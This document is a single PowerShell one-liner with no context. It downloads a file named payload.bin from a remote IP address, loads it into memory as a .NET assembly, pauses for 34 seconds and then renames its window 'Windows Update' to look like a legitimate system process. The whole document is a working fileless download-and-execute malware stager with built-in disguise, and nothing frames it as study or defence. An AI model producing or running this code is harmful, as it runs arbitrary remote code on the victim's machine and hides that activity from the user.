
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData("http://198.51.100.128/payload.bin"); [Reflection.Assembly]::Load($ManagedBytes); Start-Sleep -Seconds 34; $Host.UI.RawUI.WindowTitle = "Windows Update"
